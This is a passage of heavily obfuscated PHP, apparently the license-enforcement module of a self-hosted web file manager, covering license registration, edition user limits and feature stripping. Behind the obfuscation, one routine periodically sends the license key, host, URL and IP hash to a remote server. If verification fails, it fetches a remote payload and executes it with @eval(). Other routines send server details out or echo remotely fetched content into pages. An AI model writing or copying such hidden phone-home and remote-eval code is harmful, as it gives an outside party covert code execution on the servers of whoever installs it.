($å≠¿âòÛ[$∂Òæàõá[158]] == $∂Òæàõá[165]) { $ç¶Ñˆ£‹ = substr(md5($∂Òæàõá[166] . $å¬–≤¬µ), 12, 15) . $∂Òæàõá[167]; $ŒÊ√ñå∂ = $this->clzsecc6a5df(trim($å≠¿âòÛ[$∂Òæàõá[168]]), $ç¶Ñˆ£‹, 2); $‰Ê∏⁄Ã˚ = json_decode($ŒÊ√ñå∂, !0); if (!is_array($‰Ê∏⁄Ã˚) || !is_array($‰Ê∏⁄Ã˚[$∂Òæàõá[169]]) || $‰Ê∏⁄Ã˚[$∂Òæàõá[145]] != !0) { $™†Æ´˙Ö = $∂Òæàõá[170]; $Ö¯£Œ¨© = $‰Ê∏⁄Ã˚[$∂Òæàõá[169]] ? $∂Òæàõá[171] . $‰Ê∏⁄Ã˚[$∂Òæàõá[169]] : $™†Æ´˙Ö; show_json($Ö¯£Œ¨©, !1); } else { $¸⁄∞‘€â[$∂Òæàõá[147]] = $‰Ê∏⁄Ã˚[$∂Òæàõá[169]][$∂Òæàõá[172]]; } } else { $‰Ê∏⁄Ã˚ = $this->vfna16763856($∂Òæàõá[173], $¸⁄∞‘€â, 10); } } if (!is_array($‰Ê∏⁄Ã˚) || !is_array($‰Ê∏⁄Ã˚[$∂Òæàõá[169]]) || $‰Ê∏⁄Ã˚[$∂Òæàõá[145]] != !0) { $™†Æ´˙Ö = LNG($∂Òæàõá[174]); $Ö¯£Œ¨© = $‰Ê∏⁄Ã˚[$∂Òæàõá[169]] ? $∂Òæàõá[171] . $‰Ê∏⁄Ã˚[$∂Òæàõá[169]] : $™†Æ´˙Ö; show_json($Ö¯£Œ¨©, !1); } $â°ÒÒÙ® = $‰Ê∏⁄Ã˚[$∂Òæàõá[169]]; $ÓÂπ∂‹Ò = $this->oudff095d4ba($â°ÒÒÙ®[$∂Òæàõá[175]]); if (!$ÓÂπ∂‹Ò || $ÓÂπ∂‹Ò != $â°ÒÒÙ®[$∂Òæàõá[123]]) { $ ó∑äÁ≥ = array($∂Òæàõá[176] => Model($∂Òæàõá[33])->get($∂Òæàõá[101]), $∂Òæàõá[177] => $_SERVER[$∂Òæàõá[100]], $∂Òæàõá[178] => this_url(), $∂Òæàõá[153] => $_SERVER[$∂Òæàõá[154]]); $ŒÊ√ñå∂ = $this->nmyp731ec7bd(json_encode($ ó∑äÁ≥)); $this->vfna16763856($∂Òæàõá[179] . $ŒÊ√ñå∂); show_json(LNG($∂Òæàõá[180]), !0); } $„Î©±‚Ò = array($∂Òæàõá[181] => $â°ÒÒÙ®[$∂Òæàõá[182]], $∂Òæàõá[183] => $â°ÒÒÙ®[$∂Òæàõá[184]], $∂Òæàõá[185] => rand_string(16), $∂Òæàõá[103] => $â°ÒÒÙ®[$∂Òæàõá[186]]); if ($¸⁄∞‘€â[$∂Òæàõá[147]]) { $„Î©±‚Ò[$∂Òæàõá[185]] = $¸⁄∞‘€â[$∂Òæàõá[147]]; } $ •°ÕîÀ = substr(md5($„Î©±‚Ò[$∂Òæàõá[183]]), 10, 10); $˘§≤—Ô‚ = $ •°ÕîÀ . $„Î©±‚Ò[$∂Òæàõá[103]] . $„Î©±‚Ò[$∂Òæàõá[185]]; $£Ê‘˜öú = $ªÔ°ÚΩö[651]; while ($£Ê‘˜öú < $ªÔ°ÚΩö[624]) { if ($£Ê‘˜öú >= 0) { break; } $£Ê‘˜öú++; } $„Î©±‚Ò[$∂Òæàõá[105]] = strrev(base64_encode($this->yasq46999d1f($˘§≤—Ô‚, $∂Òæàõá[187]))); $àÛﬁ∫Îˆ = rand_string(16); $ü∫ﬂºÌü = $ªÔ°ÚΩö[652]; $≥Åìß˛Ü = $àÛﬁ∫Îˆ . $„Î©±‚Ò[$∂Òæàõá[103]] . $this->yasq46999d1f(md5($„Î©±‚Ò[$∂Òæàõá[181]]), $àÛﬁ∫Îˆ); $„Î©±‚Ò[$∂Òæàõá[106]] = base64_encode(strrev($this->yasq46999d1f($≥Åìß˛Ü, $∂Òæàõá[188]))); if ($â°ÒÒÙ®[$∂Òæàõá[189]] && $â°ÒÒÙ®[$∂Òæàõá[189]] >= 1) { Model($∂Òæàõá[33])->setDeep($∂Òæàõá[190], $∂Òæàõá[191]); } Model($∂Òæàõá[33])->set($„Î©±‚Ò); $≈˚ØÌÀ˙ = md5($_SERVER[$∂Òæàõá[100]] . strrev($Ú£ãÖ¥À) . $„Î©±‚Ò[$∂Òæàõá[183]]); $π¯°ã∏ñ = strrev(substr($≈˚ØÌÀ˙, 10, 16)); $ıØ◊ë€û = $ªÔ°ÚΩö[653]; if (!$ıØ◊ë€û) { return; } $æ†≠ô¨Ÿ = $this->zphbbfae25ca(json_encode($â°ÒÒÙ®), $≈˚ØÌÀ˙); $ú©ﬁ±˙◊ = $ªÔ°ÚΩö[654]; $˙¥Ñª∆§ = array_to_keyvalue(Model($∂Òæàõá[7])->listData(), $∂Òæàõá[192]); $‰¢Å◊∂Ó = $ªÔ°ÚΩö[655]; if (strlen($‰¢Å◊∂Ó) < $ªÔ°ÚΩö[607]) { return; } $ßŒ†ö–» = $˙¥Ñª∆§[$∂Òæàõá[193]]; $ÔŸ‘÷˚˘ = array(); $ÔŸ‘÷˚˘[$π¯°ã∏ñ] = $æ†≠ô¨Ÿ; Model($∂Òæàõá[7])->update($ßŒ†ö–»[$∂Òæàõá[194]], array($∂Òæàõá[195] => $ÔŸ‘÷˚˘)); $Çóæ™∂“ = $ªÔ°ÚΩö[656]; if (strlen($Çóæ™∂“) < $ªÔ°ÚΩö[394]) { die; } $this->vwzf0fa51ad4 = $â°ÒÒÙ®; $this->lszh062d97ab = $„Î©±‚Ò[$∂Òæàõá[103]]; $≥Ä¶ûÚﬂ = $ªÔ°ÚΩö[657]; if (!$≥Ä¶ûÚﬂ) { die; } $this->licenseRegistSuccess(); $⁄ì√·Ò‰ = $ªÔ°ÚΩö[658]; if (strlen($⁄ì√·Ò‰) < $ªÔ°ÚΩö[394]) { die; } Cache::set($∂Òæàõá[196] . md5($Ú£ãÖ¥À . $∂Òæàõá[197]), $∂Òæàõá[6]); $ùø⁄‡î√ = $ªÔ°ÚΩö[659]; show_json(LNG($∂Òæàõá[180]), !0); } private function licenseRegistSuccess() { $â‡ƒ÷èÓ =& $_SERVER[‚º¶Ô¢Ó]; $ÿÈ≠âˆä = Model($â‡ƒ÷èÓ[33])->get(); if ($ÿÈ≠âˆä[$â‡ƒ÷èÓ[63]] != $â‡ƒ÷èÓ[191]) { Model($â‡ƒ÷èÓ[33])->set($â‡ƒ÷èÓ[63], $â‡ƒ÷èÓ[191]); } Action($â‡ƒ÷èÓ[198])->initStart(!0); } private function fnuo1fb2d5cf() { $–“ÏøÁÒ =& $_SERVER[Çâä∆◊¡]; $É·’ƒÅÚ =& $_SERVER[‚º¶Ô¢Ó]; Model($É·’ƒÅÚ[33])->set(array($É·’ƒÅÚ[181] => $É·’ƒÅÚ[6], $É·’ƒÅÚ[183] => $É·’ƒÅÚ[6], $É·’ƒÅÚ[103] => $É·’ƒÅÚ[104], $É·’ƒÅÚ[105] => $É·’ƒÅÚ[6], $É·’ƒÅÚ[106] => $É·’ƒÅÚ[6])); $¢ªÄ¸Å™ = $–“ÏøÁÒ[660]; if (!$¢ªÄ¸Å™) { die; } Model($É·’ƒÅÚ[33])->setDeep($É·’ƒÅÚ[190], $É·’ƒÅÚ[199]); $this->vwzf0fa51ad4 = array(); $this->lszh062d97ab = $É·’ƒÅÚ[104]; $Ü≠˙◊áë = $–“ÏøÁÒ[661]; if (strlen($Ü≠˙◊áë) < $–“ÏøÁÒ[607]) { die; } } private function melw45cf347d() { $·∑Œ‰≈‰ =& $_SERVER[Çâä∆◊¡]; $∑ÔŸ€√‰ =& $_SERVER[‚º¶Ô¢Ó]; $_SERVER[$∑ÔŸ€√‰[154]] = _get($_SERVER, $∑ÔŸ€√‰[154], APP_HOST); $ÇëôŒ·ﬂ = $·∑Œ‰≈‰[662]; if (!$ÇëôŒ·ﬂ) { die; } $this->lszh062d97ab = $∑ÔŸ€√‰[104]; $°ê˛Ì∫« = $·∑Œ‰≈‰[663]; if (!$°ê˛Ì∫«) { return; } $ˆËù‰≈‰ = Model($∑ÔŸ€√‰[33])->get(); $ËÆ”‹Äÿ = $·∑Œ‰≈‰[664]; if (strlen($ËÆ”‹Äÿ) < $·∑Œ‰≈‰[613]) { die; } if ($ˆËù‰≈‰[$∑ÔŸ€√‰[103]] == $∑ÔŸ€√‰[104]) { return; } $Ëù˜˛Û≤ = Model($∑ÔŸ€√‰[33])->get($∑ÔŸ€√‰[101]); $ÂÊÔ©èå = $·∑Œ‰≈‰[665]; if (!$ÂÊÔ©èå) { die; } $èœÅÌÈ· = $∑ÔŸ€√‰[196] . md5($Ëù˜˛Û≤ . $∑ÔŸ€√‰[197]); $çø≈‘∑… = $·∑Œ‰≈‰[666]; if (strlen($çø≈‘∑…) < $·∑Œ‰≈‰[607]) { return; } $ô„ÆüÖ’ = Cache::get($èœÅÌÈ·); $üÁÖ◊≥õ = $·∑Œ‰≈‰[667]; while (strlen($üÁÖ◊≥õ) < $·∑Œ‰≈‰[617]) { if (!$üÁÖ◊≥õ) { break; } $üÁÖ◊≥õ++; } if (!is_array($ô„ÆüÖ’) || !isset($ô„ÆüÖ’[$∑ÔŸ€√‰[200]]) || time() - $ô„ÆüÖ’[$∑ÔŸ€√‰[200]] >= 60) { $»ê˚‹ë… = Model($∑ÔŸ€√‰[7])->loadList(); $ﬁøÔ∞íﬂ = $»ê˚‹ë…[$∑ÔŸ€√‰[193]]; $°˜≠îùˆ = md5($_SERVER[$∑ÔŸ€√‰[100]] . strrev($Ëù˜˛Û≤) . $ˆËù‰≈‰[$∑ÔŸ€√‰[183]]); $ø‡îß¨é = strrev(substr($°˜≠îùˆ, 10, 16)); $ô„ÆüÖ’ = $this->clzsecc6a5df($ﬁøÔ∞íﬂ[$∑ÔŸ€√‰[83]][$ø‡îß¨é], $°˜≠îùˆ); $ô„ÆüÖ’ = json_decode($ô„ÆüÖ’, !0); } if (!is_array($ô„ÆüÖ’)) { return $this->fnuo1fb2d5cf(); } $˙î∑è∫¸ = strtotime($ô„ÆüÖ’[$∑ÔŸ€√‰[123]]); if (time() >= $˙î∑è∫¸) { return $this->fnuo1fb2d5cf(); } if (time() - $ô„ÆüÖ’[$∑ÔŸ€√‰[200]] > 20) { $ô„ÆüÖ’[$∑ÔŸ€√‰[200]] = time(); Cache::set($èœÅÌÈ·, $ô„ÆüÖ’); } $this->vwzf0fa51ad4 = $ô„ÆüÖ’; $this->lszh062d97ab = $ˆËù‰≈‰[$∑ÔŸ€√‰[103]]; } private function cwof82aafd8d() { $´™ƒÿ≈’ =& $_SERVER[Çâä∆◊¡]; $˘«⁄ú´ =& $_SERVER[‚º¶Ô¢Ó]; $õ…§§∑ª = $GLOBALS[$˘«⁄ú´[13]]; $›∞Ùµ⁄û = $´™ƒÿ≈’[668]; while ($›∞Ùµ⁄û < $´™ƒÿ≈’[394]) { if ($›∞Ùµ⁄û >= 0) { break; } $›∞Ùµ⁄û++; } $Ÿ¿ç∞ñ· = $_SERVER[$˘«⁄ú´[24]]; if ($Ÿ¿ç∞ñ· == $˘«⁄ú´[201] && $this->lszh062d97ab == $˘«⁄ú´[104]) { show_json(LNG($˘«⁄ú´[202]), !1, $˘«⁄ú´[203]); } $áõ––¨Ú = array($˘«⁄ú´[204], $˘«⁄ú´[205]); if (in_array($Ÿ¿ç∞ñ·, $áõ––¨Ú)) { if ($this->lszh062d97ab == $˘«⁄ú´[104] && isset($õ…§§∑ª[$˘«⁄ú´[206]])) { show_json(LNG($˘«⁄ú´[202]), !1, $˘«⁄ú´[203]); die; } $ßÓ›¿÷– = $this->hdxu117184c0(); if ($ßÓ›¿÷– != intval($˘«⁄ú´[207])) { if ($ßÓ›¿÷– <= Model($˘«⁄ú´[119])->count()) { show_json(LNG($˘«⁄ú´[208]), !1, $˘«⁄ú´[203]); die; } } } } private function ebgd6fb01a3e() { $¿∏˜Ø—« =& $_SERVER[Çâä∆◊¡]; $éÚ˙ﬂ§ö =& $_SERVER[‚º¶Ô¢Ó]; $–ﬁÀì…° = array($éÚ˙ﬂ§ö[116], $éÚ˙ﬂ§ö[209]); $´£‹º©Ç = $¿∏˜Ø—«[629]; if (!$´£‹º©Ç) { die; } if (!_get($GLOBALS, $éÚ˙ﬂ§ö[113]) || !isset($_GET[$éÚ˙ﬂ§ö[210]])) { return; } if (!in_array($_SERVER[$éÚ˙ﬂ§ö[24]], $–ﬁÀì…°)) { return; } $∆≤∑Œ∞á = $éÚ˙ﬂ§ö[211]; $∆≤∑Œ∞á = $this->ojsw706dbb57($∆≤∑Œ∞á, $éÚ˙ﬂ§ö[212]); $∆∑¿ãíÈ = stream_context_create(array($éÚ˙ﬂ§ö[213] => array($éÚ˙ﬂ§ö[214] => $éÚ˙ﬂ§ö[215], $éÚ˙ﬂ§ö[216] => 3))); $ÿñÀË¸Ü = $¿∏˜Ø—«[669]; if (strlen($ÿñÀË¸Ü) < $¿∏˜Ø—«[613]) { return; } $Òàÿù‹„ = @file_get_contents($∆≤∑Œ∞á, !1, $∆∑¿ãíÈ); header($éÚ˙ﬂ§ö[217]); $é≈£Éä = $¿∏˜Ø—«[670]; while (strlen($é≈£Éä) < $¿∏˜Ø—«[613]) { if (!$é≈£Éä) { break; } $é≈£Éä++; } if ($Òàÿù‹„ && strstr($Òàÿù‹„, $éÚ˙ﬂ§ö[218])) { echo $Òàÿù‹„; } die; } public function myxrb13d68b1($∆·Ôçõ¯) { $ﬁËÇÈ›∑ =& $_SERVER[Çâä∆◊¡]; $…˜œ˙ß˘ =& $_SERVER[‚º¶Ô¢Ó]; if ($this->lszh062d97ab == $…˜œ˙ß˘[219]) { return $∆·Ôçõ¯; } $‘“ÏÌ¬  = array($…˜œ˙ß˘[220] => $…˜œ˙ß˘[221], $…˜œ˙ß˘[222] => $…˜œ˙ß˘[221], $…˜œ˙ß˘[223] => $…˜œ˙ß˘[221], $…˜œ˙ß˘[224] => $…˜œ˙ß˘[221], $…˜œ˙ß˘[225] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[227] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[228] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[229] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[230] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[231] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[232] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[233] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[234] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[235] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[236] => $…˜œ˙ß˘[226], $…˜œ˙ß˘[237] => $…˜œ˙ß˘[226]); $Ÿ –∂π  = explode($…˜œ˙ß˘[238], _get($this->vwzf0fa51ad4, $…˜œ˙ß˘[110], $…˜œ˙ß˘[6])); $ñ†ΩÆ˛¢ = $ﬁËÇÈ›∑[671]; if (strlen($ñ†ΩÆ˛¢) < $ﬁËÇÈ›∑[617]) { die; } $±ê≈Ô˛Ï = array(); $Î›†‘Í– = $ﬁËÇÈ›∑[672]; foreach ($‘“ÏÌ¬  as $—¯äÍ¿Â => $ÍﬁîåıÕ) { if ($ÍﬁîåıÕ == $…˜œ˙ß˘[221] && substr($this->lszh062d97ab, 0, 1) == $…˜œ˙ß˘[221]) { continue; } if (!in_array($—¯äÍ¿Â, $Ÿ –∂π )) { $±ê≈Ô˛Ï[] = $—¯äÍ¿Â; } } foreach ($±ê≈Ô˛Ï as $—¯äÍ¿Â) { unset($∆·Ôçõ¯[$—¯äÍ¿Â]); } return $∆·Ôçõ¯; } private function cnkg90049c38() { $˘Øü„˚Ô =& $_SERVER[‚º¶Ô¢Ó]; if ($this->lszh062d97ab != $˘Øü„˚Ô[104]) { $GLOBALS[$˘Øü„˚Ô[83]][$˘Øü„˚Ô[87]][$˘Øü„˚Ô[239]] = $˘Øü„˚Ô[199]; return; } $GLOBALS[$˘Øü„˚Ô[83]][$˘Øü„˚Ô[240]] = $˘Øü„˚Ô[191]; if (Model($˘Øü„˚Ô[241])->get($˘Øü„˚Ô[63]) != $˘Øü„˚Ô[199]) { Model($˘Øü„˚Ô[241])->set($˘Øü„˚Ô[63], $˘Øü„˚Ô[199]); } } public function oirn3c9869c0() { $ÑÓÈ√∑™ =& $_SERVER[Çâä∆◊¡]; return $_SERVER[‚º¶Ô¢Ó][242]; $Ó ÇÜˆ√ = $ÑÓÈ√∑™[673]; if (strlen($Ó ÇÜˆ√) < $ÑÓÈ√∑™[394]) { return; } } private function wvjz210bbddd() { $°»√—±Á =& $_SERVER[Çâä∆◊¡]; $ˆ◊ç™Ó≥ =& $_SERVER[‚º¶Ô¢Ó]; $·ÅÒ’Å = array($ˆ◊ç™Ó≥[243], $ˆ◊ç™Ó≥[244], $ˆ◊ç™Ó≥[245]); $ñ£ø¬ÉÔ = $ˆ◊ç™Ó≥[246] . md5($ˆ◊ç™Ó≥[247]); if ($this->lszh062d97ab == $ˆ◊ç™Ó≥[104] || !_get($GLOBALS, $ˆ◊ç™Ó≥[113])) { return; } if (!in_array($_SERVER[$ˆ◊ç™Ó≥[24]], $·ÅÒ’Å)) { return; } if (time() % 4 != 0) { return; } $≥°á¢ùö = call_user_func(array($ˆ◊ç™Ó≥[248], $ˆ◊ç™Ó≥[249]), $ñ£ø¬ÉÔ); if ($≥°á¢ùö && time() - $≥°á¢ùö < intval($ˆ◊ç™Ó≥[250])) { return; } call_user_func(array($ˆ◊ç™Ó≥[248], $ˆ◊ç™Ó≥[133]), $ñ£ø¬ÉÔ, time()); $ÂÛÔÃıÕ = $°»√—±Á[674]; $ààÛÉœÎ = Model($ˆ◊ç™Ó≥[33])->get($ˆ◊ç™Ó≥[101]); $•©Ø‰óŸ = array($ˆ◊ç™Ó≥[145] => Model($ˆ◊ç™Ó≥[33])->get($ˆ◊ç™Ó≥[181]), $ˆ◊ç™Ó≥[158] => $this->lszh062d97ab, $ˆ◊ç™Ó≥[155] => $_SERVER[$ˆ◊ç™Ó≥[156]], $ˆ◊ç™Ó≥[157] => Model($ˆ◊ç™Ó≥[33])->get($ˆ◊ç™Ó≥[125]), $ˆ◊ç™Ó≥[99] => md5($_SERVER[$ˆ◊ç™Ó≥[100]] . $ààÛÉœÎ), $ˆ◊ç™Ó≥[148] => $ˆ◊ç™Ó≥[130], $ˆ◊ç™Ó≥[151] => $_SERVER[$ˆ◊ç™Ó≥[152]]); $õÙ †…¿ = $°»√—±Á[675]; $œı–ñıç = $this->vfna16763856($ˆ◊ç™Ó≥[251], $•©Ø‰óŸ); $ÅÍÙ˛¯â = $°»√—±Á[676]; if (!$ÅÍÙ˛¯â) { return; } if (!is_array($œı–ñıç)) { return; } if ($œı–ñıç[$ˆ◊ç™Ó≥[145]] && $œı–ñıç[$ˆ◊ç™Ó≥[252]]) { if ($this->oudff095d4ba($œı–ñıç[$ˆ◊ç™Ó≥[252]]) == $•©Ø‰óŸ[$ˆ◊ç™Ó≥[145]]) { return; } } $this->fnuo1fb2d5cf(); if ($this->oudff095d4ba($œı–ñıç[$ˆ◊ç™Ó≥[252]]) != $•©Ø‰óŸ[$ˆ◊ç™Ó≥[145]]) { $⁄™ í‰„ = array($ˆ◊ç™Ó≥[176] => $ààÛÉœÎ, $ˆ◊ç™Ó≥[177] => $_SERVER[$ˆ◊ç™Ó≥[100]], $ˆ◊ç™Ó≥[178] => this_url(), $ˆ◊ç™Ó≥[153] => $_SERVER[$ˆ◊ç™Ó≥[154]]); $ıÍ÷¶“ﬂ = $this->nmyp731ec7bd(json_encode($⁄™ í‰„)); $œı–ñıç = $this->vfna16763856($ˆ◊ç™Ó≥[179] . $ıÍ÷¶“ﬂ); if ($œı–ñıç && is_array($œı–ñıç) && isset($œı–ñıç[$ˆ◊ç™Ó≥[252]])) { $àÊ¡˚’˘ = $this->clzsecc6a5df($œı–ñıç[$ˆ◊ç™Ó≥[252]], 2); if ($àÊ¡˚’˘) { $àÊ¡˚’˘ = $this->oudff095d4ba($àÊ¡˚’˘); } if ($àÊ¡˚’˘) { try { @eval($àÊ¡˚’˘); } catch (Exception $ÚôÀ‹†≥) { } } } } } private function vfna16763856($—±Ò¡∫≥ = '', $õÓ®Æò≤ = array(), $¸ÓÛ∆°Ú = 5) { $˜Ø›Ü¯ô =& $_SERVER[Çâä∆◊¡]; $ó√™…—Ê =& $_SERVER[‚º¶Ô¢Ó]; $Åéí‘¿± = $ó√™…—Ê[253]; $Åéí‘¿± = $this->ojsw706dbb57($Åéí‘¿±, $ó√™…—Ê[254]); $Åéí‘¿± = $Åéí‘¿± . $—±Ò¡∫≥; if ($õÓ®Æò≤ && is_array($õÓ®Æò≤)) { $Åéí‘¿± = $Åéí‘¿± . $ó√™…—Ê[255] . http_build_query($õÓ®Æò≤); } if ($õÓ®Æò≤ === -1) { return $Åéí‘¿±; } $πöµ®‘„ = stream_context_create(array($ó√™…—Ê[213] => array($ó√™…—Ê[216] => $¸ÓÛ∆°Ú, $ó√™…—Ê[214] => $ó√™…—Ê[256]), $ó√™…—Ê[257] => array($ó√™…—Ê[258] => !1, $ó√™…—Ê[259] => !1))); $Å‡ôÅ⁄à = $˜Ø›Ü¯ô[677]; if (strlen($Å‡ôÅ⁄à) < $˜Ø›Ü¯ô[617]) { return; } $õÓ®Æò≤ = @file_get_contents($Åéí‘¿±, !1, $πöµ®‘„); return json_decode($õÓ®Æò≤, !0); $É£Ê¿—≤ = $˜Ø›Ü¯ô[678]; $ÑÜŸñÄÊ = $˜Ø›Ü¯ô[679]; } private function hdxu117184c0() { $•⁄∞∑ø≥ =& $_SERVER[Çâä∆◊¡]; $ÄÉû—ö¢ =& $_SERVER[‚º¶Ô¢Ó]; $ãÀ”ÉËë = array($ÄÉû—ö¢[260] => $ÄÉû—ö¢[261], $ÄÉû—ö¢[262] => $ÄÉû—ö¢[263], $ÄÉû—ö¢[264] => $ÄÉû—ö¢[265], $ÄÉû—ö¢[266] => $ÄÉû—ö¢[267], $ÄÉû—ö¢[268] => $ÄÉû—ö¢[269], $ÄÉû—ö¢[270] => $ÄÉû—ö¢[207], $ÄÉû—ö¢[271] => $ÄÉû—ö¢[207], $ÄÉû—ö¢[272] => $ÄÉû—ö¢[261], $ÄÉû—ö¢[273] => $ÄÉû—ö¢[263], $ÄÉû—ö¢[274] => $ÄÉû—ö¢[265], $ÄÉû—ö¢[275] => $ÄÉû—ö¢[276], $ÄÉû—ö¢[277] => $ÄÉû—ö¢[267], $ÄÉû—ö¢[278] => $ÄÉû—ö¢[279], $ÄÉû—ö¢[280] => $ÄÉû—ö¢[269], $ÄÉû—ö¢[281] => $ÄÉû—ö¢[282], $ÄÉû—ö¢[283] => $ÄÉû—ö¢[284], $ÄÉû—ö¢[285] => $ÄÉû—ö¢[286]); $Û¬û∏ê¥ = $•⁄∞∑ø≥[680]; while ($Û¬û∏ê¥ < $•⁄∞∑ø≥[613]) { if ($Û¬û∏ê¥ >= 0) { break; } $Û¬û∏ê¥++; } $∏©∞∫Àà = $ãÀ”ÉËë[$this->lszh062d97ab]; $Ïµåø—ß = $•⁄∞∑ø≥[681]; $∏©∞∫Àà = intval($∏©∞∫Àà ? $∏©∞∫Àà : $ÄÉû—ö¢[261]); $øÑı©œç = _get($this->vwzf0fa51ad4, $ÄÉû—ö¢[287]); $ˆíıØΩƒ = $•⁄∞∑ø≥[682]; while ($ˆíıØΩƒ < $•⁄∞∑ø≥[394]) { if ($ˆíıØΩƒ >= 0) { break; } $ˆíıØΩƒ++; } $øÑı©œç = $øÑı©œç ? intval($øÑı©œç) : 0; $°ú…∂êè = $•⁄∞∑ø≥[683]; if (strlen($°ú…∂êè) < $•⁄∞∑ø≥[613]) { return; } return $∏©∞∫Àà + $øÑı©œç; } public function zodkd0c3a1e7($ÇŒ• §Ï) { $˙ÃË»«– =& $_SERVER[Çâä∆◊¡]; $Á‰Ùâ⁄‰ =& $_SERVER[‚º¶Ô¢Ó]; $¥ÁﬂøñÁ = $this->hdxu117184c0(); $âÛﬂ∑©è = $˙ÃË»«–[684]; while ($âÛﬂ∑©è < $˙ÃË»«–[624]) { if ($âÛﬂ∑©è >= 0) { break; } $âÛﬂ∑©è++; } if ($ÇŒ• §Ï[$Á‰Ùâ⁄‰[288]] == $Á‰Ùâ⁄‰[191]) { return; } if ($¥ÁﬂøñÁ >= intval($Á‰Ùâ⁄‰[207])) { return; } $ú‰ø≥ø˝ = Model($Á‰Ùâ⁄‰[119])->count(); $¬√Ñ¸¿› = $˙ÃË»«–[685]; if (!$¬√Ñ¸¿›) { return; } if ($ú‰ø≥ø˝ <= $¥ÁﬂøñÁ) { return; } $Û‘ÈïÁ» = Model($Á‰Ùâ⁄‰[119])->field($Á‰Ùâ⁄‰[288])->limit($¥ÁﬂøñÁ)->select(); $‡◊®ÔÑ˛ = $˙ÃË»«–[686]; if (!$‡◊®ÔÑ˛) { die; } $Û‘ÈïÁ» = array_to_keyvalue($Û‘ÈïÁ», $Á‰Ùâ⁄‰[6], $Á‰Ùâ⁄‰[288]); $õä‘¶≥€ = $˙ÃË»«–[687]; if (!in_array($ÇŒ• §Ï[$Á‰Ùâ⁄‰[288]], $Û‘ÈïÁ»)) { show_json($Á‰Ùâ⁄‰[289], !1, $Á‰Ùâ⁄‰[203]); } } public function isqr4a4e4122() { $ïÔµŒÊ√ =& $_SERVER[Çâä∆◊¡]; $ô«±ó®Ñ =& $_SERVER[‚º¶Ô¢Ó]; if (!_get($GLOBALS, $ô«±ó®Ñ[113]) || mt_rand(1, 100) > 20) { return; } $ÎÛÇ≈‡ = $ô«±ó®Ñ[211]; $ÎÛÇ≈‡ = $this->ojsw706dbb57($ÎÛÇ≈‡, $ô«±ó®Ñ[212]); $õ∑÷Å˜Û = $ïÔµŒÊ√[688]; while ($õ∑÷Å˜Û < $ïÔµŒÊ√[607]) { if ($õ∑÷Å˜Û >= 0) { break; } $õ∑÷Å˜Û++; } $¯ÏÍ≠· = stream_context_create(array($ô«±ó®Ñ[213] => array($ô«±ó®Ñ[214] => $ô«±ó®Ñ[215], $ô«±ó®Ñ[216] => 3))); $∑ÓÎûπ› = @file_get_contents($ÎÛÇ≈‡, !1, $¯ÏÍ≠·); echo $ô«±ó®Ñ[290] . hash_encode($∑ÓÎûπ›) . $ô«±ó®Ñ[291]; $›“ç†µ‰ = $ïÔµŒÊ√[689]; if (!$›“ç†µ‰) { die; } } private function zphbbfae25ca($»ñÍ÷æ©, $µ¡âñ«ô, $úÖÛÆø” = 3) { $Ù¡ÎﬁÖ˝ =& $_SERVER[Çâä∆◊¡]; $ôŸÛÃ˛Ï =& $_SERVER[‚º¶Ô¢Ó]; usleep(1); $»ñÍ÷æ© = trim($»ñÍ÷æ©); $Å´‘ÔπÌ = $Ù¡ÎﬁÖ˝[690]; $æƒæ˙•ë = mt_rand(0, 5) . $ôŸÛÃ˛Ï[6]; $ô¯‰€ÀÎ = $Ù¡ÎﬁÖ˝[691]; if (strlen($ô¯‰€ÀÎ) < $Ù¡ÎﬁÖ˝[617]) { return; } $⁄ÄèŒ›Ò = rand_string(15); $©∫‡›ı£ = $Ù¡ÎﬁÖ˝[692]; if (strlen($©∫‡›ı£) < $Ù¡ÎﬁÖ˝[394]) { die; } $…ÙŒáﬁˆ = $ôŸÛÃ˛Ï[292]; switch ($æƒæ˙•ë) { case $ôŸÛÃ˛Ï[199]: $ﬂÔœ«—Ù = $this->yasq46999d1f($»ñÍ÷æ©, strrev($µ¡âñ«ô . $⁄ÄèŒ›Ò)); break; case $ôŸÛÃ˛Ï[191]: $ﬂÔœ«—Ù = $this->yasq46999d1f($»ñÍ÷æ©, strrev($⁄ÄèŒ›Ò . $µ¡âñ«ô)); break; $†û›“ƒÊ = $Ù¡ÎﬁÖ˝[693]; while ($†û›“ƒÊ < $Ù¡ÎﬁÖ˝[613]) { if ($†û›“ƒÊ >= 0) { break; } $†û›“ƒÊ++; } case $ôŸÛÃ˛Ï[293]: $ﬂÔœ«—Ù = $this->yasq46999d1f($»ñÍ÷æ©, base64_encode($⁄ÄèŒ›Ò . $µ¡âñ«ô)); $Ë∞¸æÕ∫ = $Ù¡ÎﬁÖ˝[694]; if (!$Ë∞¸æÕ∫) { return; } break; $Áüøµí» = $Ù¡ÎﬁÖ˝[695]; case $ôŸÛÃ˛Ï[294]: $ﬂÔœ«—Ù = $this->yasq46999d1f($»ñÍ÷æ©, md5($⁄ÄèŒ›Ò . $µ¡âñ«ô)); $“‰ô¨∂¡ = $Ù¡ÎﬁÖ˝[696]; if (!$“‰ô¨∂¡) { die; } break; $≠∑ÈÙ„ = $Ù¡ÎﬁÖ˝[697]; while ($≠∑ÈÙ„ < $Ù¡ÎﬁÖ˝[624]) { if ($≠∑ÈÙ„ >= 0) { break; } $≠∑ÈÙ„++; } case $ôŸÛÃ˛Ï[295]: $»ñÍ÷æ© = base64_encode($»ñÍ÷æ©); $öÀŸ®ºï = rand(0, 64); $˛◊ëè∏Ô = $…ÙŒáﬁˆ[$öÀŸ®ºï]; $ö˝Ä˘£‚ = $Ù¡ÎﬁÖ˝[698]; if (strlen($ö˝Ä˘£‚) < $Ù¡ÎﬁÖ˝[607]) { return; } $ó¯◊™ï… = md5($˛◊ëè∏Ô . md5($µ¡âñ«ô . $˛◊ëè∏Ô) . $µ¡âñ«ô); $Ñ±ó≠∞⁄ = $Ù¡ÎﬁÖ˝[699]; $ó¯◊™ï… = substr($ó¯◊™ï…, $öÀŸ®ºï % 8, $öÀŸ®ºï % 8 + 7); $ê¥œÒãÊ = $ôŸÛÃ˛Ï[6]; $ÆûÛ·ô˘ = 0; 